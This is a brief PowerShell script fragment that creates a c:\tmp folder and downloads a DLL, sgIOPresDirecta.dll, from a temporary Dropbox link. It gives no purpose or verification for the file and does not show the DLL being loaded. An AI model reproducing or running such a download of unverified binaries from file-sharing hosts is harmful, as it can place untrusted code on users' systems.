$tmpdir = 0
if ((test-path c:\tmp) -eq 0) {new-item -ItemType "directory" -Path "c:\tmp"; $tmpdir = 1}
cd c:\tmp
Invoke-WebRequest -Uri "https://uc7d0e5f00ff28b6ee5d8c9aecb0.dl.dropboxusercontent.com/cd/0/get/BHYFZ81DpmfdIEF_uqdfbJUBMs_TRs01-zwyAUWqFQ_V4VoQDI8FnFf8XRayvT-VZkS1sOQ9qjA0K75ehw4MWLNttq-Fb-AURIiNMDzYt3Lxbj6ibFN53M1qAQtkHXrX48M/file?_download_id=2697018408985777482884630089131857599440766229519058711112117466&_notify_domain=www.dropbox.com&dl=1" -OutFile c:\tmp\sgIOPresDirecta.dll
